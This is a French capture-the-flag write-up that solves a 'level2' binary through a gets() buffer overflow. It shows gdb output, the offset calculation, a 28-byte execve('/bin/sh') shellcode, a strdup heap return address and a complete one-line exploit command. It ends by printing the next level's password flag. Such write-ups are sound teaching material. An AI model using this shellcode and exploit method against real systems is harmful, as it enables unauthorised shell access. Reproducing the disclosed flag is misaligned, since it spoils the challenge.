Dans ce niveau on a encore un executable ```level2```

On va le passer dans gdb avec ```info functions```, ```disas main``` et ```disas p``` (fonction appele par le main)

Dans la fonction p il y a enocre la fonction ```gets``` qui est vulnerable mais aussi ```strdup```

On va commencer par run la fonction avec un ```b *0x08048500``` pour s'arreter avant la comparaison

On va tester 'aaaaa' pour remplir le buffer de gets et chercher l'adresse de depart ```x/12wx $esp```
```sh
(gdb) x/12wx $esp
0xbffff6c0:	0xbffff6dc	0x00000000	0x00000000	0xb7e5ec73
0xbffff6d0:	0x080482b5	0x00000000	0x00000000	0x61616161
0xbffff6e0:	0xbffff800	0x0000002f	0xbffff73c	0xb7fd0ff4
```
Ici on voit bien notre ```aaaaa``` avec ```0x61616161``` donc le depart est a ```0xbffff6dc```

Ensuite avec ```(gdb) i f``` on voit ou start $eip = ```eip at 0xbffff72c``` :
```sh
(gdb) i f
Stack level 0, frame at 0xbffff730:
 eip = 0x8048500 in p; saved eip 0x804854a
 called by frame at 0xbffff740
 Arglist at 0xbffff728, args: 
 Locals at 0xbffff728, Previous frame's sp is 0xbffff730
 Saved registers:
  ebp at 0xbffff728, eip at 0xbffff72c
```

Pour obtenir la taille du buffer on va soustraire les les deux starts cat les registres se suivent :
    ```0xbffff72c - 0xbffff6dc = 3221223212 - 3221223132 = 80``` Donc 80 bytes.

Le but maintenant va etre d'injecter du shellcode sous forme de bytes, on va lui envoyer ```execve("/bin/sh")``` qui prend 28 bytes:
    ```\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80```

Il va falloir remplir le buffer avec 80 - 28 = 52 bytes

Et par la suite on va utiliser l'adresse de strdup qui copie dans la heap :
```sh
ltrace ./level2 
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                              = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5)   = 0xbffff6fc
puts("")                                        = 1
strdup("")                                      = 0x0804a008
```

Voici la commande pour lancer notre /bin/sh avec l'overflow :

```(cat <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "a"*52 + "\x08\xa0\x04\x08"') -) | ./level2```

Le script permet de lire dans le 'fichier' temporaire qui contient le script python puis dit de laisser ```stdin``` ouvert avec ```(cat <() -)```

Une fois la commande lancee le buffer overflow et note /bin/bahs se lance on peut donc ```cat /home/user/level3/.pass``` pour obtenir le flag:
    ```492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02```